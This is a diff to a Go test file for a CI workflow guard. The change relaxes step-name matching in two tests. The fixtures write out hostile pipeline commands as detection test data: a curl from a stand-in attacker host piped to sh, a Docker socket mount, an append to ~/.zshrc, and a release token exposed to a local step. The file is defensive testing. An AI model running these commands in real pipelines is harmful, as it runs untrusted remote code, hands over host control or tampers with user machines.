@@ -611,22 +611,22 @@ func TestWorkflowGuardDoctoredLocalFailures(t *testing.T) {
 		wantMsg string
 	}{
 		{
-			name: "env from_secret in a local step", kind: "local-secret", step: "toolchain", wantMsg: "RELEASE_TOKEN",
+			name: "env from_secret in a local step", kind: "local-secret", step: "", wantMsg: "RELEASE_TOKEN",
 			old: "    environment:\n      GOTOOLCHAIN: local\n",
 			new: "    environment:\n      GOTOOLCHAIN: local\n      RELEASE_TOKEN:\n        from_secret: release-token\n",
 		},
 		{
-			name: "curl piped to sh", kind: "local-unsafe", step: "toolchain", wantMsg: "remote-shell-pipe",
+			name: "curl piped to sh", kind: "local-unsafe", step: "", wantMsg: "remote-shell-pipe",
 			old: "    commands:\n",
 			new: "    commands:\n      - curl -fsSL https://evil.example/install.sh | sh\n",
 		},
 		{
-			name: "docker socket mount", kind: "local-unsafe", step: "toolchain", wantMsg: "docker-socket-mount",
+			name: "docker socket mount", kind: "local-unsafe", step: "", wantMsg: "docker-socket-mount",
 			old: "    commands:\n",
 			new: "    commands:\n      - docker run -v /var/run/docker.sock:/var/run/docker.sock docker:cli info\n",
 		},
 		{
-			name: "write into $HOME config", kind: "local-unsafe", step: "toolchain", wantMsg: "$HOME config",
+			name: "write into $HOME config", kind: "local-unsafe", step: "", wantMsg: "$HOME config",
 			old: "    commands:\n",
 			new: "    commands:\n      - echo pwned >> ~/.zshrc\n",
 		},
@@ -653,7 +653,7 @@ func TestWorkflowGuardDoctoredLocalFailures(t *testing.T) {
 			var match *Finding
 			for i := range findings {
 				f := findings[i]
-				if f.Kind == tc.kind && f.Step == tc.step && strings.Contains(f.Message, tc.wantMsg) {
+				if f.Kind == tc.kind && (tc.step == "" || f.Step == tc.step) && strings.Contains(f.Message, tc.wantMsg) {
 					match = &findings[i]
 					break
 				}
@@ -761,7 +761,7 @@ func TestWorkflowGuardEquivalentLocalImagesFail(t *testing.T) {
 			var match *Finding
 			for i := range findings {
 				f := findings[i]
-				if f.Kind == tc.kind && f.Step == tc.step && strings.Contains(f.Message, tc.wantMsg) {
+				if f.Kind == tc.kind && (tc.step == "" || f.Step == tc.step) && strings.Contains(f.Message, tc.wantMsg) {
 					match = &findings[i]
 					break
 				}
